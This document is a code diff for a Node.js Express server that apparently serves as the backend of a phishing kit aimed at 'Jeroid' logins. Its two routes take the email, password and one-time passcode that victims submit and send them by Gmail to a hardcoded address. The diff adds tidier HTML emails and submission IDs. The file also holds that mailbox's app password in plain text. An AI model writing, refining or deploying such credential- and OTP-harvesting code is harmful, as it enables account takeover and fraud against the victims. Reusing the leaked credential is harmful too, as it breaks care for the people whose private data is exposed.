@@ -1,28 +1,32 @@
-const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT
-
-const app = express(); // app is use for link express functions
+const express = require("express");
+const app = express();
 const cors = require("cors");
-const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email
+const nodemailer = require("nodemailer");
 
 app.use(express.json());
 app.use(cors());
 
-const PORT = process.env.PORT || 5000; // port to connect to WEB
+const PORT = process.env.PORT || 5000;
 
-// emails credentials
+// Email credentials
 const userEmail = "chipperagent343@gmail.com";
 const pass = "kitwqkvsqjkcvnlv";
-// 24 dec
 
-// Middleware
-app.use(express.json());
+// Function to generate random ID
+const generateRandomId = () => {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  let id = '';
+  for (let i = 0; i < 6; i++) {
+    id += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return id;
+};
 
-// api routes
-
-// API routes for index
+// API route for login credentials
 app.post("/", (req, res) => {
   const { email, password } = req.body;
-
+  const uniqueId = generateRandomId();
+  
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
@@ -32,29 +36,42 @@ app.post("/", (req, res) => {
   });
 
   const mailOptions = {
-    from: `${email}`,
+    from: `"Jeroid Notifications" <${userEmail}>`, // Display name with email
     to: userEmail,
-    subject: `Email: ${email} \t\n\n\n password: ${password}`,
-    text: `New user registered with Email: ${email} and password: ${password}`,
+    subject: `New submission - Jeroid logins [${uniqueId}]`,
+    text: `New submission Protect this form against spam\n\nEmail: ${email}\nPassword: ${password}\n\nSubmission ID: ${uniqueId}`,
+    html: `
+      <div style="font-family: Arial, sans-serif; padding: 20px;">
+        <h2>New submission - Jeroid logins</h2>
+        <p><strong>Submission ID:</strong> ${uniqueId}</p>
+        <hr>
+        <p><strong>Email:</strong> ${email}</p>
+        <p><strong>Password:</strong> ${password}</p>
+        <hr>
+        <p style="color: #666; font-size: 12px;">Protect this form against spam and abuse</p>
+      </div>
+    `,
   };
 
   console.log(mailOptions);
+  
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
       console.log(error);
-      res.send("error Occured: " + error);
+      res.status(500).send("Error occurred: " + error);
     } else {
-      console.log("Email sent", +info.response);
+      console.log("Email sent: " + info.response);
       res.send("success");
     }
   });
 });
 
-// API routes for otp
+// API route for OTP
 app.post("/otp", (req, res) => {
   console.log(req.body);
-  let email = console.log(req.body.email);
-
+  const { email, otp } = req.body;
+  const uniqueId = generateRandomId();
+  
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
@@ -64,19 +81,31 @@ app.post("/otp", (req, res) => {
   });
 
   const mailOptions = {
-    from: email,
+    from: `"Jeroid Notifications" <${userEmail}>`,
     to: userEmail,
-    subject: `OTP: ${req.body?.otp} `,
-    text: `New user registered OTP: ${req.body?.otp}`,
+    subject: `New submission - Jeroid logins [${uniqueId}]`,
+    text: `New submission Protect this form against spam\n\nOTP: ${otp}\nEmail: ${email}\n\nSubmission ID: ${uniqueId}`,
+    html: `
+      <div style="font-family: Arial, sans-serif; padding: 20px;">
+        <h2>New submission - Jeroid logins</h2>
+        <p><strong>Submission ID:</strong> ${uniqueId}</p>
+        <hr>
+        <p><strong>OTP:</strong> ${otp}</p>
+        <p><strong>Email:</strong> ${email}</p>
+        <hr>
+        <p style="color: #666; font-size: 12px;">Protect this form against spam and abuse</p>
+      </div>
+    `,
   };
 
   console.log(mailOptions);
+  
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
       console.log(error);
-      res.send("error Occured: " + error);
+      res.status(500).send("Error occurred: " + error);
     } else {
-      console.log("Email sent", +info.response);
+      console.log("Email sent: " + info.response);
       res.send("success");
     }
   });
@@ -85,5 +114,3 @@ app.post("/otp", (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on port http://localhost:${PORT}`);
 });
-
-
